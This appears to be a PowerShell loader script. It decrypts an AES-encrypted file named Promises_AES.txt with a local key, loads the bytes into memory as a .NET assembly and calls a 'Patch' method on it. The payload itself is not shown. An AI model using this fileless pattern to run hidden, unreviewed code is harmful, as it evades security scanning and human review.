<# Documnentation to be filled at a later date #>
Param($encryptedfile=$PSScriptRoot+"\Promises_AES.txt", $key= $(gc $PSScriptRoot"\samplekey.txt"))

$script = $PSScriptRoot+"\UnCompressAnEncryptedFile.ps1"

$bytes = &$script -inputFile $encryptedfile -key $key

#convert from object[] to byte[]
[System.Collections.Generic.List[byte]] $byteList = new-object System.Collections.Generic.List[byte]
foreach($byte in $bytes)
{
    $null = $byteList.Add([byte]$byte)
}
$bytes2 = $byteList.ToArray()

[System.Reflection.Assembly]::Load($bytes2)
[Editor.Methods]::Patch()